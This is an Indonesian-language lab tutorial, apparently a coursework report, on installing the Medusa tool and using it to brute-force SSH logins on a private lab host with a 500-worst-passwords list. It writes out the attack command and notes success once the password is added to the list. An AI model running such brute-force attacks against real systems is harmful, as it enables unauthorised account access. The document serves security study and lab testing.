## DEPENDENCY

* OpenSSL
* LibSSH2
* NCPFS
* LibPQ
* Subversion
* afpfs-ng

Jika bekum memiliki dependency terebut maka medusa tidak dapat diinstall, berikut command install seluruh dependency :

```
sudo add-apt-repository "deb http://archive.ubuntu.com/ubuntu/ wheezy universe multiverse"

sudo apt-get update

sudo apt-get install build-essential make patch subversion openssl libssl-dev libncp-dev libpq-dev libgcrypt11-dev libgnutls-dev libsvn-dev zlib1g-dev libssh2-1-dev libnl-dev gettext autoconf tcl8.5 libpcap0.8-dev python-scapy python-dev cracklib-runtime macchanger-gtk tshark ethtool
```

## INSTALASI MEDUSA

* **Step 1**    : Download package medusa dari [foofus.net/goons/jmk/medusa/medusa.html](http://foofus.net/goons/jmk/medusa/medusa.html)

  ```
  wget http://www.foofus.net/jmk/tools/medusa-2.2.tar.gz
  ```

* **Step 2**    : Untuk menkonfigurasi, compile dan menginstall Medusa, ketik kode berikut di terminal:

  ```
  tar -zxvf medusa-2.2.tar.gz
  cd medusa-2.2
  ./configure
  make
  make install
  ```

## UJI COBA

Pertama, Siapkan file yang terdiri dari kumpulan password yang dipisahkan oleh baris atau download [disini](/assets/ncrack-hydra/500-worst-passwords.txt). Pada uji coba kali ini, kita akan mencoba melakukan _brute force attack_ pada protokol SSH ke ip address `192.168.56.202` dengan asumsi username `pksj` dan list password menggunakan file yang telah disiapkan

**Command**:

```
medusa -h 192.168.56.202 -u "pksj" -P 500-worst-passwords.txt -M ssh
```

-h adalah host, -u adalah user -P adalah list passwordnya, -M adalah module nya. Man page bisa dilihat [disini](http://www.irongeek.com/i.php?page=backtrack-r1-man-pages/medusa)

Lalu tunggu hasilnya

![](/assets/medusa-hasil1.PNG)
  
Uji coba gagal karena password yang digunakan tidak berada dalam file [500-worst-passwords.txt](/assets/ncrack-hydra/500-worst-passwords.txt),

Untuk keberhasilan uji coba kali ini, kita tambahkan password yang digunakan dengan cara:

```
echo "pksj" >> 500-worst-passwords.txt
```

Lalu uji coba lagi

![](/assets/medusa-hasil2.PNG)

## KESIMPULAN

Dengan uji coba yang telah dilakukan, Medusa dapat berhasil menyerang protokol ssh dengan _brute force attack_ jika password dari target terdapat didalam file password yang dibuat oleh penyerang dengan waktu 2 menit. Jika password tidak terdapat dalam file, maka serangan akan gagal.

